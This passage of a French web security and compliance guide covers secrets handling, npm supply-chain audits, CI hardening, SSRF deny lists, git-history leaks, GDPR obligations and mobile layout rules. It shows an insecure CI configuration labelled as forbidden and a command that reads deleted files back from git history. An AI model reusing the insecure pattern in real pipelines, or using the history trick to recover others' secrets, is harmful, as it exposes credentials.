- **Vault** : pour les projets critiques, utiliser un gestionnaire de secrets (Doppler, HashiCorp Vault, AWS Secrets Manager)
- **Cles a portee minimale** : chaque usage a sa cle, restreinte a ce qu'il fait (une cle en lecture seule pour un job de verification CI, jamais la cle secrete complete du prestataire de paiement)
- **Identifiants courte duree plutot que secrets longue duree** : en CI, preferer l'OIDC (federation d'identite vers le cloud) a une cle statique stockee dans les secrets du depot
- **Un secret expose est un secret brule** : rotation **immediate**, meme si l'exposition semble breve ou le depot prive (voir 1.15)
- **Scanner les commits** : `gitleaks` en pre-commit et en CI, plus le « push protection » de l'hebergeur Git si disponible

### 1.10 Audit des Dependances

```bash
# A chaque PR ou en CI/CD
npm audit --audit-level=high
# OU
npx auditjs ossi  # pour les vulns connues

# Automatisation
# - Dependabot (GitHub) : PRs automatiques pour les vulns
# - Snyk : scan profond des dependances transitives
# - Socket.dev : detection des supply chain attacks
```

- **Ne JAMAIS ignorer** un audit avec des vulns `high` ou `critical`
- **Lockfile** : toujours commiter le fichier de verrouillage des dependances (`package-lock.json`, `pnpm-lock.yaml`, `yarn.lock`, `Gemfile.lock`, `poetry.lock`, etc.)
- **Verifier les licenses** : pas de licence GPL dans un projet commercial SaaS
- **Subresource Integrity (SRI)** : pour tout script charge depuis un CDN externe

```html
<script
  src="https://cdn.example.com/lib.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8w"
  crossorigin="anonymous"
></script>
```

> **Contexte 2025-2026** : la supply chain est entree dans l'OWASP Top 10 (A03:2025). Les vers npm
> auto-propages (famille « Shai-Hulud », septembre 2025 puis vagues suivantes) volent les jetons de
> publication et les secrets cloud a l'installation, puis republient des versions piegees des
> paquets de leurs victimes. Un projet peut etre touche **sans avoir change une seule ligne**.

#### 1.10.1 Un advisory n'est pas un etat fige

- **« Deja audite » n'existe pas comme statut.** Une version jugee saine aujourd'hui peut devenir
  vulnerable demain sans qu'une ligne de son code ne change : la plage d'un advisory est etendue
  retroactivement quand un contournement est publie
- **Piege vecu** : une version de `brace-expansion` etait precisement celle retenue comme saine dix
  jours plus tot (l'advisory couvrait `<=5.0.7`) ; un nouvel advisory a etendu la plage a `<5.0.9`
- **Un correctif peut etre incomplet** : lire l'advisory, pas seulement le numero de version cible
- **Connaitre le chemin de dependance avant de conclure sur le perimetre** : `npm ls <paquet>`. Un
  paquet peut etre en perimetre **prod** (`--omit=dev`) par une route inattendue (un workspace mobile,
  un outil de build), pas par l'app principale
- **Parser la sortie machine** (`npm audit --json`), jamais la fin du log (voir [20.6](#206-diagnostiquer-depuis-la-source-jamais-depuis-un-extrait))

#### 1.10.2 Scripts d'installation : mesurer la surface reelle

- **Seuls `preinstall`, `install` et `postinstall` s'executent** pour un paquet installe depuis le
  registre. `prepare`/`prepublish` **ne s'executent pas** (uniquement pour les dependances git ou locales)
- **Consequence** : compter les `prepare` presents dans `node_modules` produit des centaines de menaces
  fantomes. Sur un arbre de 1 553 paquets, la surface reelle mesuree etait de **7 paquets**
- **`--ignore-scripts` en bloc n'est pas une regle applicable partout** : il casse toute dependance a
  compilation native (hash de mot de passe, client ORM, bundler). C'est un arbitrage projet par projet.
  Si des scripts doivent tourner, les **connaitre nommement**. pnpm (v10+) et Bun n'executent plus les
  scripts des dependances par defaut : une allowlist explicite (`onlyBuiltDependencies`) est alors le
  meilleur des deux mondes

#### 1.10.3 Verifier les signatures, la provenance et l'age

```bash
npm audit signatures   # signatures du registre + attestations de provenance
```

- A lancer **apres chaque incident supply chain publie**, en plus de `npm audit` : repond a « suis-je
  touche » de facon verifiable, la ou la lecture d'un changelog ne repond a rien
- **Delai de quarantaine** : la plupart des versions piegees sont detectees et retirees en quelques
  heures a quelques jours. N'adopter une nouvelle version qu'apres un age minimal (Renovate
  `minimumReleaseAge`, pnpm `minimumReleaseAge`, equivalents yarn/bun) — par exemple 3 a 7 jours,
  sauf correctif de securite explicitement requis
- **Pour publier soi-meme** : publication depuis la CI avec provenance (« trusted publishing » OIDC),
  jamais depuis un poste avec un jeton longue duree

#### 1.10.4 Vecteur de propagation vs vecteur de vol

Un ver npm combine deux mecanismes qu'il faut evaluer **separement** :

| Vecteur         | Ce qu'il exploite                    | S'applique si                            |
| --------------- | ------------------------------------ | ---------------------------------------- |
| **Propagation** | Vol du jeton de publication npm      | Le projet **publie** des paquets sur npm |
| **Vol**         | Identifiants Git, cles cloud, `.env` | Toujours                                 |

- **Pas de jeton npm sur un poste qui ne publie pas.** Verifier le `.npmrc` du projet **et**
  `~/.npmrc` : le second est le plus souvent oublie
- Un projet qui ne publie rien reste expose au vecteur de vol : ne pas conclure « pas concerne »

#### 1.10.5 CI : secrets au niveau du step, Actions epinglees, permissions minimales

```yaml
# INTERDIT — npm ci (et tout postinstall malveillant) voit le secret
jobs:
  check:
    env:
      PAYMENT_API_KEY: ${{ secrets.PAYMENT_API_KEY }}
    steps:
      - run: npm ci
      - run: npm run check:offer

# OBLIGATOIRE — seul le step qui en a besoin le voit
permissions:
  contents: read # le GITHUB_TOKEN par defaut ne peut rien ecrire
jobs:
  check:
    steps:
      - uses: actions/checkout@<sha-complet-40-caracteres> # v4.x — epingle par SHA
      - run: npm ci
      - run: npm run check:offer
        env:
          PAYMENT_API_KEY: ${{ secrets.PAYMENT_API_KEY_READONLY }}
```

- **Secret au niveau du step** : c'est la mitigation la moins chere contre un postinstall malveillant,
  qui s'execute pendant `npm ci`, avant tout code applicatif
- **Actions tierces epinglees par SHA**, pas par tag : un tag se deplace. Incident `tj-actions/changed-files`
  (mars 2025) : le tag a ete re-pointe vers un commit qui exfiltrait les secrets de milliers de depots
- **`permissions:` explicite** au niveau du workflow, au minimum ; elargir job par job si besoin
- **`pull_request_target` + checkout du code de la PR = execution de code tiers avec les secrets** : a proscrire
- **Ne pas mettre en cache `node_modules` entre branches non fiables** (empoisonnement de cache)

#### 1.10.6 Overrides et contrat semver

- Un `overrides` qui force une version **hors de la plage semver declaree par le parent** peut rendre
  `npm audit` vert **en cassant** le paquet qu'il est cense proteger (voir [section 20](#20-fiabilite-des-signaux-de-controle))
- Cabler un controle qui detecte ces cas (script `check:lockfile` ou equivalent) — c'est la
  contrepartie obligatoire de tout scoping de l'audit
- **Si aucune version saine n'existe** : documenter l'ecart dans un fichier d'exceptions **date et
  motive**, jamais le faire disparaitre. Le controle doit aussi signaler une exception devenue
  **inutile**, sinon elle survit au probleme qu'elle couvrait

### 1.11 Protection des Donnees (basique)

- Fichiers sensibles (medical, bancaire) dans un bucket PRIVE
- Ne JAMAIS logger de donnees sensibles dans les logs d'audit
- Liste de champs sensibles a redacter automatiquement : `['password', 'rib', 'iban', 'medicalInfo', 'token', 'secret', 'creditCard', 'ssn']`
- **Piege vecu** : les `console.log` de debug en production exposent frequemment des donnees personnelles. Vecteurs de fuite courants :
  - Magic links et liens de reinitialisation de mot de passe (URL complete = acces au compte)
  - Emails utilisateur dans les logs d'authentification
  - Payloads de webhooks (paiement, etc.) contenant IDs client, emails, montants
  - Logs d'upload exposant IDs, emails, noms de fichiers
  - **Regle** : aucun `console.log` en production (regle de lint), un logger structure avec redaction automatique

```typescript
// Pattern de redaction automatique pour les logs
const SENSITIVE_FIELDS = ['password', 'rib', 'iban', 'medicalInfo', 'token', 'secret', 'creditCard', 'ssn']

function redactSensitive(obj: Record<string, any>): Record<string, any> {
  const redacted = { ...obj }
  for (const key of Object.keys(redacted)) {
    if (SENSITIVE_FIELDS.some((f) => key.toLowerCase().includes(f.toLowerCase()))) {
      redacted[key] = '[REDACTED]'
    } else if (typeof redacted[key] === 'object' && redacted[key] !== null) {
      redacted[key] = redactSensitive(redacted[key])
    }
  }
  return redacted
}
```

### 1.12 Minimisation des Donnees API (OWASP)

- **Ne JAMAIS retourner l'objet complet de la base au client** : toujours utiliser un `select` explicite
- Les requetes `findMany` (listes) doivent etre PLUS restrictives que `findUnique` (detail) — exclure les champs sensibles (`customFields` sante/allergies, `notes` internes) des listes
- Exclure les champs lourds (JSON, blobs) et les relations inutiles
- **Les relations `include` heritent du "select all"** : un `include: { payments: true }` renvoie TOUS les champs de la relation. Toujours ajouter un `select` explicite sur les relations incluses
- **Les donnees serialisees vers le client sont publiques** : tout ce qui est passe a un composant client (props, etat hydrate, `__NEXT_DATA__`, payload RSC) est lisible dans le source de la page, meme si l'UI ne l'affiche pas
- **Enumeration prevention** : ne pas reveler si un email existe deja (message generique "Si ce compte existe, un email a ete envoye")

### 1.13 Variables d'Environnement

- `.env` doit etre encode en UTF-8 (UTF-16 cause des erreurs silencieuses)
- **Jamais de BOM UTF-8 dans un fichier destine a une machine** (`.env`, `.sql`, `.json`, `.yml`).
  Sous Windows, `Out-File`, `>` et `Set-Content` (PowerShell 5) en ajoutent un par defaut. Il est
  **invisible** dans les editeurs et se manifeste par une erreur incomprehensible loin de sa cause.
  **Piege vecu** : un BOM en tete d'un fichier de migration a fait echouer PostgreSQL en `42601`
  (« syntax error » sur une premiere instruction pourtant valide). Verifier : `head -c 3 fichier | xxd`
  ne doit pas donner `efbb bf`
- **Fins de ligne** : un `.gitattributes` (`* text=auto eol=lf`) evite les diffs « tout le fichier »
  et les scripts shell qui echouent en silence sur des `\r` (voir 13.5)
- **Savoir quelle base on touche** : quand l'outil CLI (ORM, migrations) ne lit que `.env` et que ce
  fichier pointe la production, chaque commande locale est une commande de prod. Un wrapper qui
  **refuse** la prod et une commande qui affiche la cible (`db:which`) coutent dix lignes (voir 18.6)
- Les fichiers `.env.local` ont priorite : attention aux valeurs obsoletes
- Ne JAMAIS commiter de fichiers contenant des secrets
- Verifier la coherence des secrets entre local et production
- **Validation au demarrage** : verifier que toutes les variables requises sont presentes

```typescript
// src/lib/env.ts — valider au demarrage
import { z } from 'zod'

const envSchema = z.object({
  DATABASE_URL: z.string().url(),
  NEXTAUTH_SECRET: z.string().min(32),
  NEXTAUTH_URL: z.string().url(),
  // ... autres variables requises
})

export const env = envSchema.parse(process.env)
```

- **Piege vecu** : ecrire le module de validation ne suffit pas, il faut qu'il soit **importe au
  demarrage**. Sinon il ne s'execute que le jour ou une route l'importe — en production. Utiliser le
  hook de demarrage du framework (`instrumentation.ts` en Next.js, plugin de boot ailleurs) pour un
  fail-fast reel

```typescript
// src/instrumentation.ts — s'execute une seule fois au demarrage
export async function register() {
  await import('@/lib/env') // crash immediat si variable manquante
}
```

- **Une variable mal orthographiee ne declenche rien** si le code a un repli silencieux
  (`process.env.X ?? defaut`). Les variables dont depend un controle de securite sont **requises**,
  jamais optionnelles

### 1.14 Cookies & Sessions

- Limiter la taille du JWT : ne pas stocker d'images base64 ou de gros objets
- Cookies sur domaine wildcard uniquement en production
- **Piege vecu** : un `user.image` en base64 dans le JWT cause "Request Header Too Large" (431)
- **Flags obligatoires** : `HttpOnly`, `Secure`, `SameSite=Lax` (ou `Strict`)
- **Prefixe** : utiliser `__Host-` pour les cookies critiques (force HTTPS + meme domaine)
- **Un JWT ne se revoque pas** : son contenu (role, plan, tenant) reste valide jusqu'a expiration.
  Durees courtes + verification serveur des droits critiques en base, ou sessions stockees cote serveur
- **Jamais de jeton d'authentification dans `localStorage`** : lisible par n'importe quel XSS

### 1.15 Historique Git : ce qui y entre n'en sort pas

> C'est la categorie d'erreur la plus irreversible du developpement web. Un mot de passe se change,
> une faille se patche — un blob dans l'historique d'un depot survit a tout.

#### 1.15.1 Les trois illusions

| Illusion                                      | Realite                                                                                               |
| --------------------------------------------- | ----------------------------------------------------------------------------------------------------- |
| « J'ai supprime le fichier »                  | `git rm` + `.gitignore` retirent du **suivi**, pas de l'**historique**. Le blob reste lisible par SHA |
| « J'ai purge et force-pushe »                 | Les objets devenus inatteignables **continuent d'etre servis par SHA** chez l'hebergeur jusqu'a un GC |
| « Le depot est prive, donc c'est sans objet » | Vrai **tant qu'il l'est**. Chaque fork, miroir, archive ou passage en public rejoue tout l'historique |

```bash
# Un fichier "supprime" reste lisible tant qu'on connait un SHA qui le contenait
git show <sha>:public/uploads/document-confidentiel.pdf

# Retrouver tout ce qui a un jour ete ajoute au depot
git log --all --diff-filter=A --name-only --format="%H %ad"
```

#### 1.15.2 Procedure avant de rendre un depot public (ou d'en publier un fork/miroir/archive)

1. **Auditer l'historique complet**, pas le HEAD : `gitleaks detect --log-opts="--all"` ou
   `trufflehog git file://. --since-commit <premier>`
2. **Purger** sur un clone miroir (`git-filter-repo`, jamais `filter-branch`)
3. **Demander au support de l'hebergeur** (GitHub, GitLab...) le GC des objets inatteignables et la
   purge des vues en cache. Sans cette etape, la purge est cosmetique
4. Seulement ensuite, changer la visibilite

#### 1.15.3 Regles permanentes

- **Un secret commite est un secret brule** : le changer **immediatement**. La purge d'historique ne
  remplace jamais la rotation — elle ne fait que limiter la diffusion future
- **Jamais de pieces reelles en dev** dans `public/`, `uploads/`, `fixtures/` : RIB, statuts, pieces
  d'identite, exports clients. Fixtures synthetiques des le premier commit. **Piege vecu** : des pieces
  deposees pendant les tests aux commits #2 et #3 se sont retrouvees en amont de plus de 1 000 commits
  — les retirer imposait de reecrire tout le depot
- **Ne jamais commiter la configuration d'outillage local** : `.env.local`, `.vscode/settings.json`,
  fichiers de configuration locale des agents IA (`.claude/settings.local.json`, etc.) — ils
  accumulent des jetons sans qu'on y pense. Les mettre au `.gitignore` **avant** le premier commit
- **Corollaire serveur** : ce qui est dans `public/` est servi par le CDN. Verifier ce que le matcher
  du middleware laisse passer avant de l'elargir (voir 1.4)

#### 1.15.4 Si on decide de ne pas purger

C'est un arbitrage legitime (cout de reecriture eleve, depot prive, contenu peu sensible). Il doit
alors etre **ecrit, date, motive**, et surtout enoncer **la condition qui l'invalide** :

```markdown
Decision du JJ/MM/AAAA : on ne purge pas.
Motif : depot prive, 0 fork, un seul compte ; reecrire N commits imposerait de force-pusher M branches.
CE RAISONNEMENT NE TIENT QUE TANT QUE LE DEPOT EST PRIVE.
Si la visibilite doit changer : purger d'abord, puis ticket au support de l'hebergeur.
```

Sans la condition d'invalidation, l'arbitrage survit au contexte qui le rendait valide — et quelqu'un
le relira un jour comme une autorisation.

### 1.16 SSRF & appels sortants

> Le SSRF est rattache a A01 (Broken Access Control) dans l'OWASP 2025 : faire emettre une requete
> par le serveur, c'est emprunter ses droits reseau.

Toute fonction qui va chercher une URL fournie (directement ou indirectement) par un utilisateur est
concernee : apercu de lien, import par URL, webhook sortant configurable, logo distant dans un PDF,
proxy d'images.

- **Allowlist de domaines** quand c'est possible ; sinon, **resoudre le DNS puis refuser** les plages
  privees et speciales (`127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`
  — metadonnees cloud —, `::1`, `fc00::/7`) **sur l'IP effectivement contactee** (sinon : DNS rebinding)
- `https:` uniquement, pas de redirections suivies automatiquement (ou re-valider chaque saut)
- **Timeout court et taille de reponse plafonnee** : un appel sortant sans limite est aussi un DoS
- Ne jamais renvoyer au client le corps brut d'une reponse d'erreur distante

### 1.17 Webhooks entrants

- **Verifier la signature** sur le **corps brut** (avant tout parsing JSON) avec une comparaison a
  temps constant ; refuser si l'horodatage signe est trop ancien (rejeu)
- **Idempotence** : stocker l'identifiant d'evenement traite, ignorer les doublons — les prestataires
  re-livrent, parfois dans le desordre
- **Ne pas faire confiance au contenu** pour les donnees critiques : relire l'objet (paiement,
  abonnement) via l'API du prestataire si le montant ou le statut decide de quelque chose
- Repondre `2xx` vite, traiter ensuite ; un webhook lent est re-livre
- **Inventorier les endpoints declares chez le prestataire** : un endpoint de test qui vise la
  production, ou des endpoints de preview morts, c'est du bruit qui masque les vraies erreurs de livraison

### 1.18 Ne jamais envoyer un secret a un service de rendu tiers

Les services « pratiques » qui generent une image, un QR code, un graphique, un PDF ou un apercu a
partir d'une URL ou d'un texte recoivent **tout ce qu'on leur passe**.

- **Piege vecu** : le QR code d'activation du second facteur etait genere via une API publique de QR
  codes, en lui passant l'URI `otpauth://` — qui **contient le secret TOTP**. Chaque activation du
  MFA envoyait ce secret a un tiers : la protection etait decorative. Correctif : generation locale
  (bibliotheque sans dependance runtime, rendu SVG)
- **Comment il a ete trouve** : en instruisant un simple avertissement de lint sur une balise `<img>`.
  Traiter le warning mecaniquement l'aurait laisse passer (voir [20.8](#208-avant-de--corriger--verifier-quil-y-a-quelque-chose-a-corriger))
- **Regle** : tout appel a un service tiers depuis le navigateur ou le serveur se lit avec la
  question « qu'est-ce que je lui envoie ? ». Secrets, donnees personnelles, documents : rendu local
- **Tester le rendu, pas l'import** : verifier dans le balisage reellement produit qu'aucune URL
  externe ne porte la donnee

---

## 2. RGPD & Conformite

> **Cette section est OBLIGATOIRE pour tout projet deploye dans l'UE ou traitant des donnees de residents UE.**

### 2.1 Principes Fondamentaux

| Principe RGPD                   | Implementation technique                                    |
| ------------------------------- | ----------------------------------------------------------- |
| **Liceite**                     | Base legale documentee pour chaque traitement               |
| **Minimisation**                | Selection explicite des colonnes, pas de collecte excessive |
| **Limitation de finalite**      | Donnees utilisees uniquement pour l'objectif declare        |
| **Exactitude**                  | Permettre la modification par l'utilisateur                 |
| **Limitation de conservation**  | TTL defini pour chaque type de donnee                       |
| **Integrite & confidentialite** | Chiffrement, acces restreint, audit trail                   |

### 2.2 Bases Legales par Traitement

Documenter pour CHAQUE feature qui collecte des donnees :

| Traitement                  | Base legale       | Justification                                    |
| --------------------------- | ----------------- | ------------------------------------------------ |
| Inscription / compte        | Contrat           | Necessaire pour fournir le service               |
| Facturation                 | Obligation legale | Conservation comptable obligatoire               |
| Newsletter                  | Consentement      | Opt-in explicite requis                          |
| Analytics                   | Interet legitime  | Amelioration du service (anonymiser si possible) |
| Cookies fonctionnels        | Contrat           | Necessaires au fonctionnement                    |
| Cookies analytics/marketing | Consentement      | Bandeau obligatoire                              |
| Logs de securite            | Interet legitime  | Protection contre la fraude                      |

### 2.3 Bandeau de Consentement Cookies

```typescript
// Regles du bandeau de consentement
const cookieConsentRules = {
  // Cookies STRICTEMENT necessaires : pas de consentement requis
  necessary: ['session_id', 'csrf_token', 'locale'],

  // Cookies analytics : consentement REQUIS AVANT depot
  analytics: ['_ga', '_gid', '_gat'],

  // Cookies marketing : consentement REQUIS AVANT depot
  marketing: ['_fbp', '_gcl_aw'],
}
```

- **INTERDIRE** le depot de cookies analytics/marketing AVANT consentement explicite
- Le refus doit etre aussi simple que l'acceptation (pas de dark patterns)
- Stocker le choix de l'utilisateur (cookie de preference, 13 mois max)
- Permettre la modification du choix a tout moment
- **Piege** : GTM charge souvent des trackers avant le consentement — configurer le "Consent Mode" (v2, exige par Google pour les annonceurs EEE depuis mars 2024) **et verifier dans l'onglet Reseau** qu'aucun appel ne part avant le clic
- **« Tout refuser » au meme niveau que « Tout accepter »** (meme ecran, meme visibilite) : c'est la position CNIL, sanctionnee a plusieurs reprises
- **Le meilleur bandeau est celui qu'on n'a pas besoin d'afficher** : une mesure d'audience exemptee de consentement (outil configure selon les conditions CNIL : finalite strictement statistique, IP tronquee, pas de recoupement) ou une analytique sans cookie supprime le bandeau et le biais de consentement

### 2.4 Durees de Conservation

| Type de donnee              | Duree max                     | Base legale                                   |
| --------------------------- | ----------------------------- | --------------------------------------------- |
| Compte utilisateur actif    | Duree du contrat              | Contrat                                       |
| Compte inactif              | 3 ans apres derniere activite | Interet legitime                              |
| Donnees de facturation      | 10 ans                        | Obligation legale (Code de commerce)          |
| Logs de connexion           | 1 an                          | Obligation legale (LCEN)                      |
| Logs d'audit applicatif     | 6 mois - 1 an                 | Interet legitime                              |
| Donnees de paiement (CB)    | Ne JAMAIS stocker             | PCI-DSS — deleguer au prestataire de paiement |
| Cookies de consentement     | 13 mois                       | Recommandation CNIL                           |
| Donnees de contact prospect | 3 ans apres dernier contact   | Interet legitime                              |
| Backup de base de donnees   | 90 jours glissants            | Interet legitime                              |

- **Centraliser les durees dans un module unique** (constantes nommees), consomme a la fois par les
  jobs de purge **et** par la page de confidentialite. Deux sources = deux verites qui divergent
- **Toute duree promise a l'utilisateur doit exister dans le code.** Un ecran qui annonce « vos donnees
  sont conservees 90 jours apres expiration » sans job de purge correspondant est une promesse
  opposable non tenue (voir [20.9](#209-les-surfaces-declaratives-mentent-en-silence))

### 2.5 Droits des Personnes (Implementation)

#### Droit d'acces (Article 15)

```typescript
// Endpoint : GET /api/user/data-export
// Delai legal : 30 jours max
// Format : JSON + CSV lisible
async function exportUserData(userId: string) {
  const userData = await prisma.user.findUnique({
    where: { id: userId },
    include: {
      /* toutes les relations pertinentes */
    },
  })
  // Retourner en JSON structure + CSV telechargeables
  return { json: userData, csv: convertToCsv(userData) }
}
```

#### Droit a l'effacement (Article 17)

- **Soft delete INSUFFISANT** : prevoir une procedure de suppression reelle
- **Procedure en 3 etapes** :
  1. Anonymisation immediate des donnees personnelles (remplacer par `[SUPPRIME]`)
  2. Conservation des donnees financieres/legales (obligations comptables)
  3. Purge complete apres expiration de la duree legale
- **Cascade** : supprimer/anonymiser dans TOUTES les tables liees
- **Backups** : les backups seront ecrases par la rotation naturelle (90 jours)
- **Anonymiser plutot que supprimer quand des ecritures legales referencent la personne** : un
  `DELETE` en cascade sur un utilisateur peut emporter des pieces comptables a conserver 10 ans. La
  suppression d'un compte devient une anonymisation + purge des donnees non obligatoires, jamais un
  `delete` brut de l'entite utilisateur

```typescript
async function eraseUserData(userId: string) {
  await prisma.$transaction([
    // Anonymiser le profil
    prisma.user.update({
      where: { id: userId },
      data: {
        email: `deleted-${userId}@anonymized.local`,
        name: '[SUPPRIME]',
        phone: null,
        image: null,
        // Conserver uniquement ce qui est legalement requis
      },
    }),
    // Supprimer les donnees non-requises legalement
    prisma.userPreference.deleteMany({ where: { userId } }),
    prisma.notification.deleteMany({ where: { userId } }),
    // Log de la suppression (sans donnees personnelles)
    prisma.auditLog.create({
      data: { action: 'GDPR_ERASURE', entityId: userId, entityType: 'USER' },
    }),
  ])
}
```

#### Droit a la portabilite (Article 20)

- Export en format JSON structure + CSV lisible
- Inclure TOUTES les donnees fournies par l'utilisateur
- Exclure les donnees derivees/calculees et les donnees d'autres utilisateurs

#### Droit d'opposition (Article 21)

- Lien de desinscription dans CHAQUE email marketing
- Mecanisme d'opt-out pour les communications non-essentielles
- Respecter les listes d'opposition (Bloctel pour la France)

### 2.6 Privacy by Design

- **Minimisation a la conception** : ne collecter que ce qui est strictement necessaire pour la feature
- **Pseudonymisation** : utiliser des UUIDs plutot que des identifiants naturels (email, nom)
- **Chiffrement au repos** : pour les donnees sensibles (medicales, bancaires) — AES-256
- **Chiffrement en transit** : HTTPS obligatoire (TLS 1.2 minimum, TLS 1.3 recommande)
- **Separation des donnees** : les donnees sensibles dans des tables/buckets separes avec acces restreint
- **Anonymisation des donnees de dev** : ne JAMAIS utiliser de vraies donnees en dev/staging

### 2.7 Notification de Breach (Article 33-34)

**Procedure obligatoire :**

1. **Detection** : alerting automatise (voir section Observabilite)
2. **Evaluation** : determiner la gravite (donnees concernees, nombre de personnes)
3. **Notification CNIL** : dans les **72 heures** si risque pour les droits des personnes
4. **Notification utilisateurs** : sans delai excessif si risque eleve
5. **Documentation** : registre des violations (obligatoire meme sans notification)

**Template de notification CNIL :**

- Nature de la violation
- Categories et nombre approximatif de personnes concernees
- Consequences probables
- Mesures prises ou envisagees

### 2.8 Sous-traitants (Article 28)

- **DPA (Data Processing Agreement)** obligatoire avec chaque sous-traitant :

| Sous-traitant   | Type de donnees            | Localisation         | DPA                 |
| --------------- | -------------------------- | -------------------- | ------------------- |
| Vercel          | Logs, headers              | US (EU region dispo) | A verifier          |
| Neon/Supabase   | Donnees applicatives       | EU si configure      | A verifier          |
| Stripe          | Paiements                  | US + EU              | Inclus dans les CGU |
| Sentry          | Stack traces, user context | US                   | A verifier          |
| SendGrid/Resend | Emails, adresses           | US                   | A verifier          |
| Cloudflare      | Trafic, IP                 | Global               | A verifier          |

- **Clause de localisation** : privilegier les regions EU pour le stockage
- **Transferts hors UE** : necessitent des Clauses Contractuelles Types (CCT) ou une decision d'adequation

### 2.9 Registre des Traitements (Article 30)

Maintenir un fichier `REGISTRE_TRAITEMENTS.md` ou equivalent :

```markdown
| #   | Traitement  | Finalite              | Base legale       | Donnees            | Duree         | Sous-traitant |
| --- | ----------- | --------------------- | ----------------- | ------------------ | ------------- | ------------- |
| 1   | Inscription | Fourniture du service | Contrat           | email, nom, mdp    | Duree contrat | Neon, Vercel  |
| 2   | Facturation | Obligation comptable  | Obligation legale | factures, montants | 10 ans        | Stripe        |
| 3   | Analytics   | Amelioration service  | Interet legitime  | pages vues, duree  | 26 mois       | GA4           |
```

### 2.10 Mentions Legales & Politique de Confidentialite

Pages OBLIGATOIRES :

- **Mentions legales** : identite, hebergeur, directeur de publication
- **Politique de confidentialite** : traitements, droits, contact DPO
- **CGU/CGV** : conditions d'utilisation et de vente
- **Politique cookies** : detail des cookies, finalites, durees
- **Declaration d'accessibilite** : obligatoire pour les services concernes par l'European Accessibility Act (voir [5.0](#50-cadre-reglementaire--wcag-22-et-european-accessibility-act))

**La page legale decrit l'infrastructure reelle — et vieillit avec elle.** Hebergeur, localisation
des donnees, transferts hors UE, sous-traitants, mecanisme d'authentification, durees de conservation :
chacune de ces mentions devient fausse au premier changement technique, et rien ne le signale.

- **Piege vecu** : apres la migration de la base de donnees vers l'UE, la page legale continuait
  d'annoncer un hebergement aux Etats-Unis et une section entiere de « transferts hors UE ». Double
  cout : une mention inexacte sur un document opposable, **et** un argument commercial (« donnees
  hebergees en UE ») laisse sur la table. La meme page attribuait l'authentification a un fournisseur
  tiers alors qu'elle etait faite maison — elle sous-vendait la securite reelle
- **Regle** : toute migration d'infrastructure, tout changement de prestataire ou de duree de
  conservation inclut, dans sa definition de fini, la relecture de la page legale. Aucune affirmation
  n'y entre sans avoir ete verifiee dans le code ou la console du fournisseur

### 2.11 IA dans le produit (si applicable)

- **Si le produit appelle un modele d'IA**, c'est un sous-traitant comme un autre (DPA, localisation,
  conservation des prompts, usage pour l'entrainement) et une ligne du registre
- **AI Act (reglement UE 2024/1689)** : obligations de transparence (informer l'utilisateur qu'il
  interagit avec une IA, marquer les contenus generes) applicables par etapes a partir d'aout 2026 —
  verifier le calendrier en vigueur, il a fait l'objet de propositions de report
- **Si le produit n'en utilise pas, ne pas le laisser entendre** : une fonctionnalite « par IA » retiree
  du code mais toujours presente dans le JSON-LD, la page legale ou la landing est une affirmation
  fausse (voir [20.9](#209-les-surfaces-declaratives-mentent-en-silence))

---

## 3. Responsivite & Mobile

### 3.1 Regles Fondamentales

- **Responsive = fini** : une feature non-responsive n'est PAS livrable. Le responsive fait partie de la
  Definition of Done (voir [section 0](#0-barre-de-qualite-par-feature-definition-of-done)), il ne se
  retrofite pas en audit plus tard — refaire le responsive d'un ecran code desktop-only est une reecriture.
- **Mobile-first** : commencer par `flex-col` puis `sm:flex-row`, `md:flex-row`, etc.
- **Tous les inputs en `w-full`** sur mobile
- **ZERO scroll horizontal** : jamais, nulle part, sous aucun pretexte
- Modaux : `overflow-y: auto; overflow-x: hidden;` sur le corps, `max-height: 85dvh` (voir 3.17)
- **Test minimum avant de dire "fini"** : ouvrir l'ecran a 360-375px de large et verifier qu'il n'y a
  aucun debordement horizontal et que tout reste lisible/cliquable.
- **Tester aussi a 320px CSS** (WCAG 1.4.10 Reflow) : c'est la largeur d'un ecran de 1280px zoome a
  400 %. Le contenu doit rester utilisable sans scroll horizontal (hors tableaux de donnees, cartes)
- **Ne JAMAIS bloquer le zoom** : `maximum-scale=1` ou `user-scalable=no` dans le viewport est une
  non-conformite WCAG (1.4.4). Le bon remede au zoom iOS est la police 16px (3.2), pas le blocage

```html
<!-- Viewport recommande -->
<meta
  name="viewport"
  content="width=device-width, initial-scale=1, viewport-fit=cover, interactive-widget=resizes-content"
/>
```

- `viewport-fit=cover` : necessaire pour utiliser `env(safe-area-inset-*)` (3.17)
- `interactive-widget=resizes-content` (Chrome Android) : le clavier virtuel redimensionne la mise en
  page au lieu de la recouvrir — les footers sticky de formulaires restent visibles

### 3.2 Prevention du Zoom iOS (CRITIQUE)

> C'est le bug mobile #1 le plus frequent et le plus insidieux.

- **TOUS les `<input>`, `<select>`, `<textarea>` doivent avoir `text-base` (16px minimum)**
- `text-sm` (14px) declenche un auto-zoom sur iOS Safari au focus
- Ce zoom cree un scroll horizontal permanent meme apres defocus
- **Solution** : audit systematique de tous les composants de formulaire
- Aussi ajouter `min-h-[44px]` sur tous les inputs

```css
/* INTERDIT */
input {
  font-size: 14px;
} /* 0.875rem / text-sm */

/* OBLIGATOIRE */
input {
  font-size: 16px;
} /* 1rem / text-base */
```

### 3.3 Touch Targets (Apple HIG)

- **Minimum 44x44px** pour TOUS les elements interactifs (boutons, liens, icones cliquables)
- Pattern Tailwind : `min-h-[44px] min-w-[44px] p-3`
- Inputs : `min-h-[44px]` ou `py-2.5` minimum
- **Plancher legal** : WCAG 2.2 (2.5.8, niveau AA) exige **24x24px** ou un espacement equivalent. 44px
  est notre cible, 24px est la limite en dessous de laquelle c'est une non-conformite
- **Zone tactile > zone visuelle** : une icone de 20px peut avoir une zone cliquable de 44px
  (padding ou pseudo-element `::before` en `inset: -12px`), sans alourdir le visuel
- **Rien ne doit dependre du survol** : actions revelees uniquement au `:hover`, tooltips au survol
  seul — inaccessibles au doigt. Conditionner les effets de survol a `@media (hover: hover)` et
  toujours prevoir un acces au tap/focus

### 3.4 Clavier Mobile Optimise

| Type de champ | Attributs HTML                                      |
| ------------- | --------------------------------------------------- |
| Montant       | `type="text" inputMode="decimal"` + parsing serveur |
| Telephone     | `type="tel" inputMode="tel"`                        |
| Email         | `type="email" inputMode="email"`                    |
| Recherche     | `type="search" inputMode="search"`                  |
